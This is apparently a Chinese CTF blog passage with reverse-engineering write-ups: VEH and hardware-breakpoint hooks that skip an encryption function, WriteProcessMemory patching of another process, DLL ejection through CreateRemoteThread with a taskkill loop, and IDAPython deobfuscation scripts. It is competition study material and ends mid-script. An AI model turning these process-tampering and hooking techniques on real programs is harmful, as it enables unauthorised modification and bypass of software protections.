class="title">breakpoint</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS,TRUE,(DWORD)lpThreadParameter);</span><br><span class="line"><span class="built_in">SuspendThread</span>(hThread);</span><br><span class="line">CONTEXT ctx;</span><br><span class="line">ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(hThread, &amp;ctx);</span><br><span class="line">ctx.Dr0 = PatchAddr;</span><br><span class="line">ctx.Dr7 = <span class="number">0x405</span>;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>实现VEH hook</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">ExceptionHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 校验异常地址和异常类型</span></span><br><span class="line"><span class="keyword">if</span> ((DWORD64)ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == PatchAddr </span><br><span class="line">&amp;&amp; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP) &#123;</span><br><span class="line"><span class="comment">// 修改对应的寄存器</span></span><br><span class="line">ExceptionInfo-&gt;ContextRecord-&gt;Rax = (DWORD64)<span class="number">0x0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* Input = (<span class="type">const</span> <span class="type">char</span>*)ExceptionInfo-&gt;ContextRecord-&gt;Rcx;</span><br><span class="line"><span class="type">const</span> DWORD64 InputLen = ExceptionInfo-&gt;ContextRecord-&gt;Rdx;</span><br><span class="line"><span class="type">char</span>* flag = (<span class="type">char</span>*)ExceptionInfo-&gt;ContextRecord-&gt;R8;</span><br><span class="line">DWORD* OutputLen = (DWORD*)ExceptionInfo-&gt;ContextRecord-&gt;R9;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将明文覆写到输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; InputLen; i++) &#123;</span><br><span class="line">flag[i] = Input[i];</span><br><span class="line">&#125;</span><br><span class="line">*OutputLen = InputLen;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改Rip跳过函数</span></span><br><span class="line">ExceptionInfo-&gt;ContextRecord-&gt;Rip += <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>测试结果</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270044938.png" alt="image-20230409163408542"></p>        <h2 id="3-往入自行指定的不同的文件里写入明文信息"   >          <a href="#3-往入自行指定的不同的文件里写入明文信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-往入自行指定的不同的文件里写入明文信息" class="headerlink" title="3.往入自行指定的不同的文件里写入明文信息"></a>3.往入自行指定的不同的文件里写入明文信息</h2>      <p>经调试可得，输出文件的名字写在内存中，因此直接修改对应进程内存即可</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202304091636979.png" alt="image-20230409163609946"></p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">byte buff[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> pId;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目的文件&quot;</span>);</span><br><span class="line"><span class="type">char</span> file[<span class="number">100</span>];</span><br><span class="line">cin &gt;&gt; file;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入进程ID:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pId);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">buff[i] = file[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buff[<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">//将异或0x40改为异或0</span></span><br><span class="line">buff[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE handle=<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, pId);</span><br><span class="line">DWORD64 PatchAddr;</span><br><span class="line">HMODULE moduleHandle;</span><br><span class="line">    DWORD bytesNeeded;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">EnumProcessModules</span>(handle, &amp;moduleHandle, <span class="built_in">sizeof</span>(moduleHandle), &amp;bytesNeeded)) &#123;</span><br><span class="line">        DWORD64 baseAddress = (DWORD64)moduleHandle;</span><br><span class="line"><span class="comment">// 使用baseAddress进行进一步操作</span></span><br><span class="line"><span class="comment">//修改为目标文件名</span></span><br><span class="line">PatchAddr = (DWORD64)baseAddress + <span class="number">0x772F9</span>;</span><br><span class="line"><span class="comment">//将异或0x45改为异或0</span></span><br><span class="line">DWORD64 PatchAddr2 = (DWORD64)baseAddress + <span class="number">0x772E8</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">char</span> buff2[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(handle, (LPVOID)(PatchAddr+<span class="number">1</span>), buff2, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//检测只有当开头为contest时才进行修改</span></span><br><span class="line"><span class="keyword">if</span> (buff2[<span class="number">0</span>] == <span class="number">0x63</span> &amp;&amp; buff2[<span class="number">1</span>] == <span class="number">0x6f</span> &amp;&amp; buff2[<span class="number">2</span>] == <span class="number">0x6e</span>) &#123;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(handle, (LPVOID)PatchAddr, buff, <span class="number">10</span>, <span class="literal">NULL</span>); </span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(handle, (LPVOID)PatchAddr2, buff, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>在任务管理器获取对应的线程id输入即可</p><p>测试结果</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202304091637419.png" alt="image-20230409163751394"></p>        <h1 id="决赛-PC客户端-解题过程"   >          <a href="#决赛-PC客户端-解题过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#决赛-PC客户端-解题过程" class="headerlink" title="决赛-PC客户端-解题过程"></a>决赛-PC客户端-解题过程</h1>              <h2 id="第一题"   >          <a href="#第一题" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2>      <p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270048710.png" alt="image-20230427004841647"></p><p>简述一下思路</p><p>首先这个文件会不断的创建进程，用火绒剑可以扫得该程序往别的进程里面写入了WorkingServiceDll.dll文件</p><p>第一题要求杀掉这个，首先把dll给卸载了，再把这个程序给关掉</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROC_NAME (<span class="string">L&quot;WorkingService.exe&quot;</span>) <span class="comment">//定义要卸载对应dll的进程名</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME (<span class="string">L&quot;WorkingServiceDll.dll&quot;</span>)      <span class="comment">//定义要卸载的dll名</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">BOOL <span class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bMore = FALSE, bFound = FALSE;</span><br><span class="line">    HANDLE hSnapshot, hProcess, hThread;</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    MODULEENTRY32 me = &#123; <span class="built_in">sizeof</span>(me) &#125;; <span class="comment">//定义一个用于储存模块快照的结构体</span></span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="comment">//dwPID=notepad进程ID</span></span><br><span class="line">    <span class="comment">//使用TH32CS_SNAPMODULE参数</span></span><br><span class="line">    <span class="comment">//获取加载到notepad进程的DLL名称</span></span><br><span class="line">    hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, dwPID);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//此函数检索与进程相关联的第一个模块的信息</span></span><br><span class="line">    bMore = <span class="built_in">Module32First</span>(hSnapshot, &amp;me);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (; bMore; bMore = <span class="built_in">Module32Next</span>(hSnapshot, &amp;me))   <span class="comment">//bMore用于判断该进程的模块快照是否还有，bFound用于判断是否找到了我们想要卸载的dll模块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName))</span><br><span class="line">        &#123;</span><br><span class="line">            bFound = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!bFound)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2. 通过进程PID获取进程句柄</span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;进程(%d) 打开失败[%d]\n&quot;</span>, dwPID, GetLastError);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3. 获取FreeLibrary函数的地址</span></span><br><span class="line">    hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">    <span class="comment">//4.创建线程来执行FreeLibrary(modBaseAddr要卸载的dll模块基址)</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        DWORD dwPID = <span class="number">0xFFFFFFFF</span>;                                <span class="comment">//初始化PID为0xFFFFFFFF</span></span><br><span class="line">        HANDLE hSnapShot = INVALID_HANDLE_VALUE; <span class="comment">//初始化快照句柄为INVALID_HANDLE_VALUE</span></span><br><span class="line">        PROCESSENTRY32 pe;    <span class="comment">//定义一个存放 快照进程信息 的一个结构体</span></span><br><span class="line">        <span class="comment">//1.获取当前系统进程快照</span></span><br><span class="line">        pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">        hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">//2.枚举全部进程</span></span><br><span class="line">        <span class="built_in">Process32First</span>(hSnapShot, &amp;pe);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;  </span><br><span class="line">            dwPID = pe.th32ProcessID;</span><br><span class="line">        <span class="built_in">EjectDll</span>(dwPID, DEF_DLL_NAME);  <span class="comment">//卸载DLL</span></span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;taskkill /f /t /im WorkingService.exe&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe));     <span class="comment">//循环查找下一个进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>第二题要求让这个程序慢下来</p><p>本来是想hook他写入文件的函数的，但是断不到那个地址</p><p>然后又发现这个程序和初赛使用了同一个base64变表</p><p>于是和初赛一样VEH hook然后VEH在里面塞个sleep(10000)</p><p>第三题</p><p>程序执行了两步加密</p><p>一个是变表的base64，另一个是选取其中的几位异或上0x78</p><p>但是具体如何异或的因为时间不够没找到。</p>        <h2 id="附加题"   >          <a href="#附加题" class="heading-link"><i class="fas fa-link"></i></a><a href="#附加题" class="headerlink" title="附加题"></a>附加题</h2>      <p>驱动</p><p>牡蛎达牡蛎，鸭蛋莫鸭蛋</p>        <h1 id="赛后总结"   >          <a href="#赛后总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#赛后总结" class="headerlink" title="赛后总结"></a>赛后总结</h1>      <p>这个算是我第一次通宵打的比赛，都没怎么睡 <del>菜</del></p><p>加上决赛刚好于是清明得回家打不满3天于是有点着急了。</p><p>打比赛更重要的是良好的心态和相信自己会出的信念</p><p>是非常难忘的经历，学到了不少东西，也感谢在实验室一起通宵的寞叶师傅和xman师傅</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN2018排位赛_Dragon_Quest</title>
      <link href="/2023/04/26/XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9B-Dragon-Quest/"/>
      <url>/2023/04/26/XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9B-Dragon-Quest/</url>
      
        <content type="html"><![CDATA[        <h2 id="XMAN2018排位赛-Dragon-Quest"   >          <a href="#XMAN2018排位赛-Dragon-Quest" class="heading-link"><i class="fas fa-link"></i></a><a href="#XMAN2018排位赛-Dragon-Quest" class="headerlink" title="[XMAN2018排位赛]Dragon Quest"></a>[XMAN2018排位赛]Dragon Quest</h2>      <p>64位ida打开</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304262229968.png" alt="image-20230426222920909"></p><p>当函数start_quest返回值为0x1337时输出flag</p><p>塞了不少混淆</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304262230184.png" alt="image-20230426223036156"></p><p>可以看出表达式恒为0，存在大量不透明谓词</p><p>idapython</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare1</span>(<span class="params">buff, addr</span>):</span><br><span class="line">    enc = [<span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>]  <span class="comment"># mov eax, x25</span></span><br><span class="line">    eax = [<span class="number">0xB8</span>, <span class="number">0x00</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> buff[i] != enc[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    tmp = addr + <span class="number">25</span></span><br><span class="line">    patch_bytes(tmp, <span class="built_in">bytes</span>(eax))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare2</span>(<span class="params">buff, addr</span>):</span><br><span class="line">    enc = [<span class="number">0x8B</span>, <span class="number">0x0C</span>, <span class="number">0x25</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>]  <span class="comment"># mov ecx, x25</span></span><br><span class="line">    ecx = [<span class="number">0xB9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x90</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> buff[i] != enc[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    tmp = addr + <span class="number">25</span></span><br><span class="line">    patch_bytes(tmp, <span class="built_in">bytes</span>(ecx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare3</span>(<span class="params">buff, addr</span>):</span><br><span class="line">    enc = [<span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x0C</span>, <span class="number">0x25</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x44</span>]  <span class="comment"># mov r9d, x25</span></span><br><span class="line">    r9d = [<span class="number">0x41</span>, <span class="number">0xB9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x90</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">if</span> buff[i] != enc[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    tmp = addr + <span class="number">29</span></span><br><span class="line">    patch_bytes(tmp, <span class="built_in">bytes</span>(r9d))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_addr = <span class="number">0x00404350</span></span><br><span class="line">    end_addr = <span class="number">0x00404AD5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr, <span class="number">1</span>):</span><br><span class="line">        buf = get_bytes(i, <span class="number">9</span>)</span><br><span class="line">        compare1(buf, i)</span><br><span class="line">        compare2(buf, i)</span><br><span class="line">        compare3(buf, i)</span><br></pre></td></tr></table></div></figure><p>更好的版本 (pizza yyds)</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_xref</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_patch</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">if</span>(get_bytes(ea, <span class="number">1</span>) == <span class="string">b&quot;\x8B&quot;</span>): <span class="comment"># mov eax-edi, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">1</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(get_bytes(ea, <span class="number">2</span>) == <span class="string">b&quot;\x44\x8B&quot;</span>): <span class="comment"># mov r8d-r15d, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">2</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea + <span class="number">1</span>, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0000000000610318</span>, <span class="number">0x00000000006105AC</span>, <span class="number">4</span>):</span><br><span class="line">    ref = ida_xref.get_first_dref_to(addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr).center(<span class="number">20</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    <span class="keyword">while</span>(ref != ida_idaapi.BADADDR):</span><br><span class="line">        do_patch(ref)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;patch at &#x27;</span> + <span class="built_in">hex</span>(ref))</span><br><span class="line">        ref = ida_xref.get_next_dref_to(addr, ref)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></div></figure><p>去除混淆后，返回值由函数sanitize_input生成，该函数同样是加了不透明谓词</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270025020.png" alt="image-20230427002501982"></p><p>去除后进行分析</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270027866.png" alt="image-20230427002713826"></p><p>即v11等于0</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270028850.png" alt="image-20230427002839812"></p><p>求和的值要求与之前压入hero数组的值相同</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 补全初始状态为0</span></span><br><span class="line">vec = [<span class="number">0</span>, <span class="number">0x0064</span>, <span class="number">0x00D6</span>, <span class="number">0x010A</span>, <span class="number">0x0171</span>, <span class="number">0x01A1</span>, <span class="number">0x020F</span>, <span class="number">0x026E</span>, <span class="number">0x02DD</span>, <span class="number">0x034F</span>,</span><br><span class="line">       <span class="number">0x03AE</span>, <span class="number">0x041E</span>, <span class="number">0x0452</span>, <span class="number">0x04C6</span>, <span class="number">0x0538</span>, <span 